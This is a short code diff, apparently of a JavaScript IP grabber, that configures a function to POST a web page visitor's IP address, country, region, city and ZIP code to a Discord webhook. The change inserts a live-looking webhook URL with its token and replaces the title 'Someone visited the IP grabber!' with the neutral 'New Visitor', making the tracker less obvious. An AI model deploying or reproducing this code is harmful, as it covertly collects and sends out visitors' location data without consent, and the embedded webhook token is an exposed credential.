@@ -3,7 +3,7 @@ function monke(json)
 {
      var request = new XMLHttpRequest();
      
-     request.open("POST", "Replace this with your webhook!");
+     request.open("POST", "https://discord.com/api/webhooks/1123634009780527175/VqPZeAcBGAhLZn0qblM9w_12rZZgpkcSbSLrmcYHsTEB_3pWWCLuu49OmklnbC-wW70R");
 
      request.setRequestHeader('Content-type', 'application/json');
 
@@ -14,7 +14,7 @@ function monke(json)
           content: "@everyone",
           embeds: [
                {
-                    title: "Someone visited the IP grabber!",
+                    title: "New Visitor ",
                     color: 1752220,
                     description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
                }
